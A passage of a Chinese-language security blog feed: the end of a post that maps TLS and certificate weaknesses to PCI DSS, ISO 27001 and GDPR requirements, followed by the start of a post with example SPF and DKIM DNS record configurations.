href=\"#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA-2\">#</a> 改善複雜度等級為：低複雜度高風險</h3>\n<p><strong>SSL/TLS 協議過舊</strong>：建議停用如 TLS 1.1 等過舊協議。</p>\n<h3 id=\"%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA-3\"><a class=\"direct-link\" href=\"#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA-3\">#</a> 改善複雜度等級為：低複雜度中風險</h3>\n<p><strong>使用不安全的加密法</strong>：建議在伺服器設定中停用此加密套件</p>\n<h3 id=\"%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%B8%AD%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA\"><a class=\"direct-link\" href=\"#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%B8%AD%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA\">#</a> 改善複雜度等級為：中複雜度中風險</h3>\n<p><strong>憑證撤銷機制未設定完整</strong>：建議依據伺服器設定，使用加密套件完整此功能</p>\n<p><strong>憑證授權機關資源記錄檢查</strong>：建議為網域設定 CAA RR</p>\n<p><strong>憑證過期</strong>：建議聯繫 CA 更新憑證</p>\n<p>普遍網站在憑證相關的設置上較容易有疏漏，建議優先檢視協議過舊以及是否使用不安全的加密法，也因為這兩項的初步檢視較為容易，所以建議在憑證的類別中，將這兩項進行優先修復，而改善複雜度為中的三項憑證設置，由於檢視方式以及改善複雜度較高，因此可以評估這三項憑證項目的必要性，優先修復其餘中複雜度中風險項目，但因為憑證與資料的加密和保護息息相關，所以與之相關聯的法規項目也特別多，所以如果很在意法遵的朋友建議還是將憑證項目的風險修復順序提高一個層級。</p>\n<h3 id=\"%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-4\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-4\">#</a> 常見風險對應法規技術面項目：</h3>\n<p><strong>憑證撤銷機制未設定完整、不安全加密套件、憑證過期</strong></p>\n<p><strong>PCIDSS</strong> ：</p>\n<p>Encrypt transmission of cardholder data across open，public networks</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-4\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-4\">#</a> 細項說明：</h3>\n<blockquote>\n<p>1: Use strong cryptography and security protocols to safeguard sensitive cardholder data during transmission over open, public networks.</p>\n</blockquote>\n<blockquote>\n<p>1.1: Ensure wireless networks transmitting cardholder data, or connected to the cardholder data environment, use industry best practices to implement strong encryption for authentication and transmission.</p>\n</blockquote>\n<p>Develop and maintain secure systems and applications</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-5\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-5\">#</a> 細項說明：</h3>\n<blockquote>\n<p>6.5.4: Do not allow insecure communications.</p>\n</blockquote>\n<h3 id=\"%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-pcidss%EF%BC%9A%E9%99%A4%E4%BA%86%E4%B8%8D%E5%85%81%E8%A8%B1%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%80%9A%E8%A8%8A%E4%BB%A5%E5%A4%96%EF%BC%8C%E4%B9%9F%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8%E5%BC%B7%E5%8A%A0%E5%AF%86%E5%92%8C%E5%AE%89%E5%85%A8%E5%8D%94%E8%AD%B0%E4%BE%86%E4%BF%9D%E8%AD%B7%E6%95%8F%E6%84%9F%E6%95%B8%E6%93%9A%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-pcidss%EF%BC%9A%E9%99%A4%E4%BA%86%E4%B8%8D%E5%85%81%E8%A8%B1%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%80%9A%E8%A8%8A%E4%BB%A5%E5%A4%96%EF%BC%8C%E4%B9%9F%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8%E5%BC%B7%E5%8A%A0%E5%AF%86%E5%92%8C%E5%AE%89%E5%85%A8%E5%8D%94%E8%AD%B0%E4%BE%86%E4%BF%9D%E8%AD%B7%E6%95%8F%E6%84%9F%E6%95%B8%E6%93%9A%E3%80%82\">#</a> <strong>懶人包之 PCIDSS</strong>：除了不允許不安全的通訊以外，也需要使用強加密和安全協議來保護敏感數據。</h3>\n<p><strong>ISO27001：</strong></p>\n<p>Cryptographic Controls</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-6\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-6\">#</a> 細項說明：</h3>\n<blockquote>\n<p>Encryption and cryptographic controls are often seen as one of the key weapons in the security arsenal, however, on its own it is not the “silver bullet” that solves every problem. Incorrect selection of cryptographic technologies and techniques or the poor management of cryptographic material (e.g. keys and certificates) can create vulnerabilities themselves.</p>\n</blockquote>\n<h3 id=\"%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-iso27001%EF%BC%9A%E5%8A%A0%E5%AF%86%E6%8A%80%E8%A1%93%E7%9A%84%E9%81%B8%E6%93%87%E9%8C%AF%E8%AA%A4%E6%88%96%E5%8A%A0%E5%AF%86%E7%B4%A0%E6%9D%90%EF%BC%88%E4%BE%8B%E5%A6%82%E5%AF%86%E9%91%B0%E5%92%8C%E8%AD%89%E6%9B%B8%EF%BC%89%E7%9A%84%E7%AE%A1%E7%90%86%E4%B8%8D%E5%96%84%E5%8F%AF%E8%83%BD%E6%9C%83%E5%B0%8E%E8%87%B4%E6%9C%8D%E5%8B%99%E7%94%A2%E7%94%9F%E6%BC%8F%E6%B4%9E%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-iso27001%EF%BC%9A%E5%8A%A0%E5%AF%86%E6%8A%80%E8%A1%93%E7%9A%84%E9%81%B8%E6%93%87%E9%8C%AF%E8%AA%A4%E6%88%96%E5%8A%A0%E5%AF%86%E7%B4%A0%E6%9D%90%EF%BC%88%E4%BE%8B%E5%A6%82%E5%AF%86%E9%91%B0%E5%92%8C%E8%AD%89%E6%9B%B8%EF%BC%89%E7%9A%84%E7%AE%A1%E7%90%86%E4%B8%8D%E5%96%84%E5%8F%AF%E8%83%BD%E6%9C%83%E5%B0%8E%E8%87%B4%E6%9C%8D%E5%8B%99%E7%94%A2%E7%94%9F%E6%BC%8F%E6%B4%9E%E3%80%82\">#</a> <strong>懶人包之 ISO27001</strong>：加密技術的選擇錯誤或加密素材（例如密鑰和證書）的管理不善可能會導致服務產生漏洞。</h3>\n<p><strong>GDPR：</strong></p>\n<p>Responsibility of the controller</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-7\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-7\">#</a> 細項說明：</h3>\n<blockquote>\n<p>Taking into account the nature, scope, context and purposes of processing as well as the risks of varying likelihood and severity for the rights and freedoms of natural persons, the controller shall implement appropriate technical and organisational measures to ensure and to be able to demonstrate that processing is performed in accordance with this Regulation. 2Those measures shall be reviewed and updated where necessary.</p>\n</blockquote>\n<blockquote>\n<p>Where proportionate in relation to processing activities, the measures referred to in paragraph 1 shall include the implementation of appropriate data protection policies by the controller.</p>\n</blockquote>\n<blockquote>\n<p>Adherence to approved codes of conduct as referred to in <a href=\"https://gdpr-info.eu/art-40-gdpr/\">Article 40</a> or approved certification mechanisms as referred to in <a href=\"https://gdpr-info.eu/art-42-gdpr/\">Article 42</a> may be used as an element by which to demonstrate compliance with the obligations of the controller.</p>\n</blockquote>\n<p>Data protection by design and by default</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-8\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-8\">#</a> 細項說明：</h3>\n<blockquote>\n<p>Taking into account the state of the art, the cost of implementation and the nature, scope, context and purposes of processing as well as the risks of varying likelihood and severity for rights and freedoms of natural persons posed by the processing, the controller shall, both at the time of the determination of the means for processing and at the time of the processing itself, implement appropriate technical and organisational measures, such as pseudonymisation, which are designed to implement data-protection principles, such as data minimisation, in an effective manner and to integrate the necessary safeguards into the processing in order to meet the requirements of this Regulation and protect the rights of data subjects.</p>\n</blockquote>\n<blockquote>\n<p>The controller shall implement appropriate technical and organisational measures for ensuring that, by default, only personal data which are necessary for each specific purpose of the processing are processed. 2That obligation applies to the amount of personal data collected, the extent of their processing, the period of their storage and their accessibility. 3In particular, such measures shall ensure that by default personal data are not made accessible without the individual’s intervention to an indefinite number of natural persons.</p>\n</blockquote>\n<blockquote>\n<p>An approved certification mechanism pursuant to <a href=\"https://gdpr-info.eu/art-42-gdpr/\">Article 42</a> may be used as an element to demonstrate compliance with the requirements set out in paragraphs 1 and 2 of this Article.</p>\n</blockquote>\n<p>Security of processing</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-9\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-9\">#</a> 細項說明：</h3>\n<blockquote>\n<p>Taking into account the state of the art, the costs of implementation and the nature, scope, context and purposes of processing as well as the risk of varying likelihood and severity for the rights and freedoms of natural persons, the controller and the processor shall implement appropriate technical and organisational measures to ensure a level of security appropriate to the risk, including inter alia as appropriate:</p>\n</blockquote>\n<blockquote>\n<p>1.the pseudonymisation and encryption of personal data;</p>\n</blockquote>\n<blockquote>\n<p>2.the ability to ensure the ongoing confidentiality, integrity, availability and resilience of processing systems and services;</p>\n</blockquote>\n<blockquote>\n<p>3.the ability to restore the availability and access to personal data in a timely manner in the event of a physical or technical incident;</p>\n</blockquote>\n<blockquote>\n<p>4.a process for regularly testing, assessing and evaluating the effectiveness of technical and organisational measures for ensuring the security of the processing.</p>\n</blockquote>\n<blockquote>\n<p>In assessing the appropriate level of security account shall be taken in particular of the risks that are presented by processing, in particular from accidental or unlawful destruction, loss, alteration, unauthorised disclosure of, or access to personal data transmitted, stored or otherwise processed.</p>\n</blockquote>\n<blockquote>\n<p>Adherence to an approved code of conduct as referred to in <a href=\"https://gdpr-info.eu/art-40-gdpr/\">Article 40</a> or an approved certification mechanism as referred to in <a href=\"https://gdpr-info.eu/art-42-gdpr/\">Article 42</a> may be used as an element by which to demonstrate compliance with the requirements set out in paragraph 1 of this Article.</p>\n</blockquote>\n<blockquote>\n<p>The controller and processor shall take steps to ensure that any natural person acting under the authority of the controller or the processor who has access to personal data does not process them except on instructions from the controller, unless he or she is required to do so by Union or Member State law.</p>\n</blockquote>\n<h3 id=\"%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-gdpr-%EF%BC%9A%E6%8E%A7%E5%88%B6%E8%80%85%E6%87%89%E5%AF%A6%E6%96%BD%E9%81%A9%E7%95%B6%E7%9A%84%E6%95%B8%E6%93%9A%E4%BF%9D%E8%AD%B7%E6%94%BF%E7%AD%96%E5%92%8C%E6%95%B8%E6%93%9A%E4%BF%9D%E8%AD%B7%E5%8E%9F%E5%89%87%EF%BC%8C%E4%BE%8B%E5%A6%82%E5%B0%87%E5%BF%85%E8%A6%81%E7%9A%84%E4%BF%9D%E8%AD%B7%E6%8E%AA%E6%96%BD%E6%95%B4%E5%90%88%E5%88%B0%E8%B3%87%E6%96%99%E8%99%95%E7%90%86%E9%81%8E%E7%A8%8B%E4%B8%AD%EF%BC%8C%E4%B9%9F%E9%9C%80%E7%A2%BA%E4%BF%9D%E8%99%95%E7%90%86%E6%95%B8%E6%93%9A%E7%9A%84%E7%B3%BB%E7%B5%B1%E5%92%8C%E6%9C%8D%E5%8B%99%E6%A9%9F%E5%AF%86%E6%80%A7%E3%80%81%E5%AE%8C%E6%95%B4%E6%80%A7%E3%80%81%E5%8F%AF%E7%94%A8%E6%80%A7%EF%BC%8C%E9%81%BF%E5%85%8D%E6%9C%AA%E7%B6%93%E6%8E%88%E6%AC%8A%E8%80%8C%E6%8F%AD%E9%9C%B2%E7%9A%84%E5%80%8B%E4%BA%BA%E6%95%B8%E6%93%9A%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-gdpr-%EF%BC%9A%E6%8E%A7%E5%88%B6%E8%80%85%E6%87%89%E5%AF%A6%E6%96%BD%E9%81%A9%E7%95%B6%E7%9A%84%E6%95%B8%E6%93%9A%E4%BF%9D%E8%AD%B7%E6%94%BF%E7%AD%96%E5%92%8C%E6%95%B8%E6%93%9A%E4%BF%9D%E8%AD%B7%E5%8E%9F%E5%89%87%EF%BC%8C%E4%BE%8B%E5%A6%82%E5%B0%87%E5%BF%85%E8%A6%81%E7%9A%84%E4%BF%9D%E8%AD%B7%E6%8E%AA%E6%96%BD%E6%95%B4%E5%90%88%E5%88%B0%E8%B3%87%E6%96%99%E8%99%95%E7%90%86%E9%81%8E%E7%A8%8B%E4%B8%AD%EF%BC%8C%E4%B9%9F%E9%9C%80%E7%A2%BA%E4%BF%9D%E8%99%95%E7%90%86%E6%95%B8%E6%93%9A%E7%9A%84%E7%B3%BB%E7%B5%B1%E5%92%8C%E6%9C%8D%E5%8B%99%E6%A9%9F%E5%AF%86%E6%80%A7%E3%80%81%E5%AE%8C%E6%95%B4%E6%80%A7%E3%80%81%E5%8F%AF%E7%94%A8%E6%80%A7%EF%BC%8C%E9%81%BF%E5%85%8D%E6%9C%AA%E7%B6%93%E6%8E%88%E6%AC%8A%E8%80%8C%E6%8F%AD%E9%9C%B2%E7%9A%84%E5%80%8B%E4%BA%BA%E6%95%B8%E6%93%9A%E3%80%82\">#</a> <strong>懶人包之 GDPR</strong> ：控制者應實施適當的數據保護政策和數據保護原則，例如將必要的保護措施整合到資料處理過程中，也需確保處理數據的系統和服務機密性、完整性、可用性，避免未經授權而揭露的個人數據。</h3>\n<h3 id=\"%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-4\"><a class=\"direct-link\" href=\"#%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-4\">#</a> <strong>風險修復參考資料：</strong></h3>\n<p><strong>協議過舊：</strong></p>\n<p><a href=\"https://docs.microsoft.com/zh-tw/security/engineering/disable-legacy-tls\"><strong>Windows Server 2019 現已依憑證繫結提供 TLS 版本強制執行功能 - Security documentation</strong></a></p>\n<p><strong>憑證相關：</strong></p>\n<p>aws:</p>\n<p><a href=\"https://docs.aws.amazon.com/acm/latest/userguide/acm-overview.html\"><strong>What Is AWS Certificate Manager?</strong></a></p>\n<p>gcp(load balancer):</p>\n<p><a href=\"https://cloud.google.com/load-balancing/docs/ssl-certificates/google-managed-certs\"><strong>Using Google-managed SSL certificates | Load Balancing | Google Cloud</strong></a></p>\n<p>gcp(k8s engine):</p>\n<p><a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/managed-certs\"><strong>Using Google-managed SSL certificates</strong></a></p>\n<p>azure key vault:</p>\n<p><a href=\"https://docs.microsoft.com/en-us/azure/key-vault/certificates/certificate-scenarios\"><strong>Get started with Key Vault certificates</strong><br>\n</a></p>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> <strong>結論</strong></h2>\n<p>將風險與法規比對並不是為了說明若是未修復風險會違反多少法規，而是為了藉著風險的修復來佐證自身對於法規的重視，舉例來說， 當客戶詢問公司有沒有符合 GDPR 的規範時，若是能夠提供憑證的風險修復紀錄，其實就是一個很好的佐證資料。</p>\n<p>而本文所提到的改善複雜度，則是為了目前常見的資源有限但問題不會消失的情況而提供決策的輔助，目前市面上有許多相關的評估報告和掃描也是圍繞著風險管理的概念延伸，若是能因此而管理自身的風險以及對應的法規並找到最適的風險修復方案的話，無論是在稽核或是安全性的管控上都是一筆十分划算的投資。</p>\n<h2 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80%EF%BC%9A\">#</a> 延伸閱讀：</h2>\n<p><strong>資安科普番外篇（一）-大意了啊沒有閃！常見網站曝險你中了幾項？！</strong></p>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-common-risk-exposure/\">大意了啊沒有閃！常見網站曝險你中了幾項？！</a>)</p>\n</blockquote>\n<h2 id=\"%E5%8F%83%E8%80%83%E6%96%87%E7%8D%BB%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E6%96%87%E7%8D%BB%EF%BC%9A\">#</a> 參考文獻：</h2>\n<p><strong>PCIDSS</strong></p>\n<blockquote>\n<p><a href=\"https://kirkpatrickprice.com/video/pci-requirement-6-develop-maintain-secure-systems-applications/\">https://kirkpatrickprice.com/</a></p>\n</blockquote>\n<p><strong>ISO27001</strong></p>\n<blockquote>\n<p><a href=\"https://www.isms.online/iso-27001/annex-a-10-cryptography/\">https://www.isms.online/iso-27001</a></p>\n</blockquote>\n<p><strong>GDPR</strong></p>\n<blockquote>\n<p><a href=\"https://gdpr-info.eu/art-24-gdpr/\">https://gdpr-info.eu</a></p>\n</blockquote>\n",
      "date_published": "2021-07-16T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples/",
      "title": "關於 email security 的大小事 — 範例篇",
      "content_html": "<!-- summary -->\n<p>有鑒於大家了解了 SPF、DKIM、DMARC 設置上的原理與地雷後，對於如何設置可能還是霧颯颯，因此決定再推出範例篇讓大家看一些實際的紀錄以及設置方式。希望可以讓大家輕鬆做好 email security！</p>\n<!-- summary -->\n<p>以下有不懂的標籤可以參照設定篇：<br>\nSPF 的設定 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf\">關於 email security 的大小事 — 設定篇 SPF</a><br>\nDKIM、DMARC 的設定 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc\">關於 email security 的大小事 — 設定篇 DKIM、DMARC</a></p>\n<p>以下主要以 <a href=\"https://mxtoolbox.com/SuperTool.aspx?run=toolpage\">mxtoolbox</a> 作為紀錄查詢工具。</p>\n<hr>\n<h2 id=\"spf\"><a class=\"direct-link\" href=\"#spf\">#</a> SPF</h2>\n<p>在設定 SPF 時最重要的就是知道『有哪些寄信的網域』。我們用幾種情境舉例：</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%8F%AA%E6%9C%89%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%8F%AA%E6%9C%89%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F\">#</a> 情境一：只有自家網域</h3>\n<p>首先，你需要知道自己有哪些 mail server 。</p>\n<p>這時你有下面幾種選項：</p>\n<p><strong>mail server 與寄信 domain 相同(IP 同)</strong>，允許 IP 就是此 domain 的 IP：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 a -all</code></pre>\n<p><strong>mail server 與寄信 domain 相同(IP 不同)</strong>，允許 IP 就是 mail server 的 IP：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 mx -all</code></pre>\n<p><strong>mail server 與寄信 domain 不同，或是有多台 mail server</strong>，需一一列出：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 mx:mail-server-1 mx:mail-server-2 mx:mail-server-3 -all</code></pre>\n<p><strong>已經有別的寄信 domain 設置好 SPF</strong> ，例如 google 自己是 email provider 又同時提供 email hosting，以下為 <a href=\"http://gmail.com\">gmail.com</a> 的 SPF 紀錄：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 redirect=_spf.google.com</code></pre>\n<p>建議如果想省下 DNS query 的扣打，可以考慮 <strong>展開成 <code>ip4</code> <code>ip6</code> 機制</strong>，例如以下為 MailChimp（<a href=\"http://servers.mcsv.net\">servers.mcsv.net</a>）的 SPF 紀錄：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 ip4:205.201.128.0/20 ip4:198.2.128.0/18 ip4:148.105.8.0/21 -all</code></pre>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%9B%B2%E7%AB%AF%E6%88%96%E6%98%AF%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%9B%B2%E7%AB%AF%E6%88%96%E6%98%AF%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F\">#</a> 情境二：使用雲端或是第三方網域</h3>\n<p>當你使用第三方網域寄信，就必須把他們的 mail server 也放到自己的 SPF 紀錄中，一般而言他們都已經有設好 SPF 紀錄了，所以你只要用 <code>include</code> 機制就可以涵蓋。請去查詢他們設置 SPF 的 domain 然後加到紀錄中：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 include:third-1 include:third-2 include:third-3 -all</code></pre>\n<p><em>***文末附上最近整理的常見第三方 SPF domain***</em></p>\n<p>以 OneDegree 為例，我們使用的 hosting provider 為 Microsoft Office365，第三方服務為： SendGrid、MailChimp、FreshDesk。去網站上查一下或是在服務的 portal 裡應該就能輕鬆找到設置 SPF 的 domain，例如下圖是 MailChimp 的文件：</p>\n<p><img src=\"/img/posts/crystal/email-sec-examples/mailchimp.png\" alt=\"\"></p>\n<p>資料收集完成，就能初步建構出我們的 SPF 紀錄：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 include:spf.protection.outlook.com include:sendgrid.net include:servers.mcsv.net include:email.freshdesk.com -all</code></pre>\n<p>再來就是優化的部分，你可以去 <a href=\"https://mxtoolbox.com/SuperTool.aspx?run=toolpage\">mxtoolbox</a> 逐一查詢以上 include 的這些紀錄，會發現 <a href=\"http://email.freshdesk.com\">email.freshdesk.com</a> 已經包含了 <a href=\"http://sendgrid.net\">sendgrid.net</a> ，也就是說其實我們自己的紀錄中已經重複 include 了，造成一次多餘的 DNS query。</p>\n<p><img src=\"/img/posts/crystal/email-sec-examples/mxtoolbox.png\" alt=\"\"></p>\n<p>排除重複的部分，我們就能得到最終的 SPF 紀錄：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 include:spf.protection.outlook.com include:servers.mcsv.net include:email.freshdesk.com -all</code></pre>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%90%8C%E6%99%82%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F%E8%B7%9F%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%90%8C%E6%99%82%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F%E8%B7%9F%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F\">#</a> 情境三：同時使用自家網域跟第三方網域</h3>\n<p>這應該是最常見的情況了。只要結合上面的兩個情境就行，一般來說會把自家的 <code>a</code> <code>mx</code> 放前面，<code>include</code> 的放後面，不過這也沒有規定，純粹閱讀方便就是了。</p>\n<p>要特別注意的是，如果你有用到 <code>redirect</code> 記得要放最後，因為 <code>redirect</code> 是一種 modifier，也就是前面的 mechanism 都沒有 match 才會執行，相對的，跳到 <code>redirect</code> 的 SPF 紀錄之後，就會以那筆 SPF 紀錄為主，本來在 <code>redirect</code> 後面的東西都會被忽略。所以如果要用就要長這樣：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 mx include:spf.protection.outlook.com include:sendgrid.net redirect:_spf.PROVIDERSERVER.COM</code></pre>\n<h3 id=\"%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84\"><a class=\"direct-link\" href=\"#%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84\">#</a> 發布紀錄</h3>\n<p>建構好 SPF 紀錄後請在你的 DNS 裡以 TXT 類型發布出去，等待幾分鐘應該就可以在 mxtoolbox 上查詢到了。使用雲端 hosting provider服務請一樣參考官方文件：<a href=\"https://support.google.com/a/answer/10684623?hl=en&amp;ref_topic=10685331\">Gsuite</a>、<a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/set-up-spf-in-office-365-to-help-prevent-spoofing?view=o365-worldwide#create-or-update-your-spf-txt-record\">Office365</a>、<a href=\"https://docs.aws.amazon.com/ses/latest/DeveloperGuide/send-email-authentication-spf.html\">Amazon SES</a>。</p>\n<hr>\n<h2 id=\"dkim\"><a class=\"direct-link\" href=\"#dkim\">#</a> DKIM</h2>\n<p>DKIM 不同於 SPF 在於，一筆 SPF 紀錄就代表了一個寄信 domain，因此你有幾個會寄信的 domain 就要有幾筆 SPF 紀錄，但是 DKIM 是一個 domain 可以有很多筆的，只要各個 mail server 使用的 selector 都不同就好。</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E8%87%AA%E6%9E%B6%E7%9A%84-email-server\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E8%87%AA%E6%9E%B6%E7%9A%84-email-server\">#</a> 情境一：自架的 email server</h3>\n<p>可以用這個 <a href=\"https://dmarcly.com/tools/dkim-record-generator\">DKIM generator</a> 來產生公私鑰，請把私鑰放入 mail server 設定中保管好，然後把公鑰從 DNS 發布出去。</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E9%9B%B2%E7%AB%AF-hosting-provider\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E9%9B%B2%E7%AB%AF-hosting-provider\">#</a> 情境二：雲端 hosting provider</h3>\n<p>如果你使用的是雲端 hosting provider 的服務，例如用 Microsoft Office365 或是 Gsuite，那麼 DKIM 的設定已經內建了幾乎不用你做。如果你想用自己的key pair 也可以，跟著教學設定：<a href=\"https://support.google.com/a/answer/174126\">Gsuite</a>、<a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/use-dkim-to-validate-outbound-email?view=o365-worldwide\">Office365</a>、<a href=\"https://docs.aws.amazon.com/ses/latest/DeveloperGuide/send-email-authentication-dkim-easy-setup-domain.html\">Amazon SES</a> 就可以了，他還會幫你發布到 DNS。</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\">#</a> 情境三：第三方服務</h3>\n<p>如果是其他第三方服務（marketing email 等等），做法往往是請你發一筆 CNAME 紀錄指到由第三方服務實際創造並發布的公鑰，這樣就可以由第三方服務統一管理公私鑰，你也不用擔心 DKIM 沒發好。</p>\n<p>舉例來說，如果是用 SendGrid，完成 “Settings/Sender Authentication/Authenticate Your Domain” 的流程後會來到這一頁：</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-examples/dmarcly.png\" /><figcaption><p>from <a href=\"https://dmarcly.com/blog/how-to-set-up-spf-and-dkim-for-sendgrid\">DMARCLY tutorial</a></p>\n</figcaption></figure></p>\n<p>你就照著發在 DNS 就好，如下：</p>\n<pre class=\"language-txt\"><code 